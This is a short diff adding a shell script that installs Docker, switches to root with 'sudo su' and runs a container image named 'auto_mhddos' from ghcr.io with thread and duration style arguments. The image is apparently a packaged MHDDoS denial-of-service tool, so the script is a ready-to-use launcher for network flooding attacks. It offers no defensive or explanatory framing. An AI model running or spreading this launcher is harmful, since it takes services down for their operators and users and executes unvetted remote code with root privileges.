@@ -1,0 +1,3 @@
+sudo snap install docker;
+sudo su;
+docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100  --debug
